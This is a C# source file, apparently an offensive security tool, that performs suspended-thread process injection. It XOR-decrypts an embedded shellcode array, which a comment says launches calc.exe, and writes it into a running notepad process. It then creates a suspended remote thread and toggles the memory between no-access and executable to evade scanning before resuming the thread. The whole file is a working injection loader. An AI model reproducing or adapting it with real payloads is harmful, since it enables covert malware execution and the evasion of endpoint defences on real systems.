using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SuspendedInjection
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static readonly uint MEM_COMMIT = 0x1000;
        static readonly uint PROC_ACCESS_ALL = 0x001F0FFF;
        static readonly uint CREATE_SUSPENDED = 0x00000004;
        private static readonly byte[] key = Encoding.ASCII.GetBytes("passkey");

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40,
            NoAccess = 0x01
        }


        static void Main(string[] args)
        {
            // https://github.com/plackyhacker/Suspended-Thread-Injection

            // shellcode for calc.exe
            byte[] cryptcode = new byte[296] {
                0x8c, 0x29, 0xf0, 0x97, 0x9b, 0x8d, 0xb9, 0x70, 0x61, 0x73, 0x32, 0x3a, 0x24, 0x29, 0x22,
                0x30, 0x25, 0x3b, 0x5a, 0xb7, 0x1c, 0x38, 0xea, 0x21, 0x13, 0x23, 0xee, 0x2b, 0x68, 0x29,
                0xf8, 0x21, 0x4b, 0x2d, 0xf2, 0x02, 0x31, 0x3b, 0x7c, 0xdc, 0x2f, 0x33, 0x3d, 0x50, 0xba,
                0x3b, 0x5a, 0xa5, 0xd5, 0x4c, 0x00, 0x0f, 0x71, 0x47, 0x45, 0x38, 0xb1, 0xa8, 0x7e, 0x32,
                0x6a, 0xa4, 0x9b, 0x9d, 0x33, 0x32, 0x22, 0x23, 0xee, 0x2b, 0x50, 0xea, 0x31, 0x4f, 0x23,
                0x64, 0xa9, 0xfb, 0xe1, 0xfb, 0x73, 0x6b, 0x65, 0x31, 0xf5, 0xa1, 0x07, 0x14, 0x23, 0x64,
                0xa9, 0x20, 0xea, 0x3b, 0x6b, 0x2f, 0xee, 0x39, 0x50, 0x28, 0x72, 0xa3, 0x88, 0x33, 0x31,
                0x8f, 0xa8, 0x32, 0xf8, 0x5f, 0xed, 0x31, 0x71, 0xb7, 0x3e, 0x42, 0xa2, 0x2d, 0x48, 0xb0,
                0xcd, 0x32, 0xb2, 0xa2, 0x68, 0x38, 0x71, 0xa0, 0x4b, 0x93, 0x1e, 0x94, 0x35, 0x73, 0x2d,
                0x57, 0x7b, 0x2e, 0x5c, 0xa8, 0x05, 0xb9, 0x2b, 0x37, 0xe0, 0x25, 0x5d, 0x39, 0x60, 0xa3,
                0x15, 0x2a, 0xee, 0x75, 0x38, 0x25, 0xf8, 0x33, 0x77, 0x2c, 0x78, 0xa0, 0x20, 0xf8, 0x77,
                0xe3, 0x2d, 0x78, 0xa0, 0x20, 0x2b, 0x32, 0x33, 0x3b, 0x20, 0x2a, 0x20, 0x2b, 0x32, 0x32,
                0x24, 0x23, 0x38, 0xe2, 0x9f, 0x53, 0x2a, 0x37, 0x86, 0x90, 0x39, 0x32, 0x2a, 0x31, 0x2d,
                0xf2, 0x62, 0x88, 0x24, 0x8c, 0x94, 0x9a, 0x24, 0x38, 0xdb, 0x72, 0x73, 0x6b, 0x65, 0x79,
                0x70, 0x61, 0x73, 0x3b, 0xe6, 0xe8, 0x78, 0x71, 0x61, 0x73, 0x32, 0xd1, 0x54, 0xf2, 0x1f,
                0xe6, 0x8c, 0xa6, 0xd0, 0x85, 0x64, 0x5a, 0x6b, 0x32, 0xc9, 0xcd, 0xf0, 0xc4, 0xed, 0x9e,
                0xa6, 0x3b, 0xe8, 0xa1, 0x51, 0x4c, 0x67, 0x0f, 0x79, 0xeb, 0x9e, 0x99, 0x05, 0x64, 0xc8,
                0x34, 0x78, 0x17, 0x16, 0x1a, 0x61, 0x2a, 0x32, 0xe2, 0xbf, 0x86, 0xa5, 0x22, 0x49, 0x2f,
                0x1c, 0x0c, 0x17, 0x14, 0x0e, 0x04, 0x00, 0x37, 0x16, 0x00, 0x03, 0x15, 0x16, 0x1e, 0x58,
                0x57, 0x25, 0x13, 0x00, 0x1f, 0x10, 0x45, 0x00, 0x01, 0x15, 0x61 };

            byte[] shellcode = XorCrypt(cryptcode);

            // openprocess
            Process procInfo = Process.GetProcessesByName("notepad");
            int pid = procInfo[0].Id;
            IntPtr procHandle = OpenProcess(PROC_ACCESS_ALL, false, pid );
            Console.WriteLine("[+] Get process id: {0}", pid);

            // allocate with virtualallocex with correct permission
            IntPtr memAlloc = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, (uint)MemoryProtection.ExecuteReadWrite);
            Console.WriteLine("[+] allocated memory with virtualallocex");

            // write payload with writeprocessmemory
            IntPtr output;
            WriteProcessMemory(procHandle, memAlloc, shellcode, shellcode.Length, out output);
            VirtualProtectEx(procHandle, memAlloc, (UIntPtr)shellcode.Length, (uint)MemoryProtection.NoAccess, out uint lpflOldProtect);
            Console.WriteLine("[+] payload written with writeprocessmemory");

            // create suspended thread
            IntPtr hThread = CreateRemoteThread(procHandle, IntPtr.Zero, 0, memAlloc, IntPtr.Zero, CREATE_SUSPENDED, out hThread);
            Console.WriteLine("[+] thread created. i'm going to sleep... ");

            // sleep 10 sec
            System.Threading.Thread.Sleep(60000);

            // change protection with virtualprotectex and setting to page-executereadwrite
            VirtualProtectEx(procHandle,memAlloc,(UIntPtr)shellcode.Length,(uint)MemoryProtection.ExecuteReadWrite,out lpflOldProtect);
            Console.WriteLine("[+] changed virtualprotect flags");

            // resume thread
            ResumeThread(hThread);
            Console.WriteLine("[+] thread resumed. do you see a shell?");

            return;
        }

        static byte[] XorCrypt(byte[] bytecode)
        {
            byte[] xoredcode = new byte[bytecode.Length];
            for (int i = 0; i < bytecode.Length; i++)
            {
                xoredcode[i] = (byte)(bytecode[i] ^ key[i % key.Length]);
            }

            return xoredcode;
        }
    }
}

